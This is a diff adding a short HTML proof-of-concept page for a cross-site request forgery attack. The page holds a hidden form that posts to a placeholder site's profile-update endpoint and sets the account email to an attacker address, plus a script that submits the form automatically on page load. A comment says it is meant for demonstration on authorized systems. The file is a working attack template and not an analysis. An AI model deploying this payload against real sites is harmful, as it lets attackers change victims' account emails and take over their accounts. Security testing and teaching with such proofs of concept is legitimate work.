@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This is a demonstration of how a CSRF attack could be crafted.</p>
+
+    <form action="http://your-target-app.com/update-profile" method="POST" id="csrfForm">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+
+    <script>
+        // Auto-submit (used only for PoC demonstration on authorized systems)
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
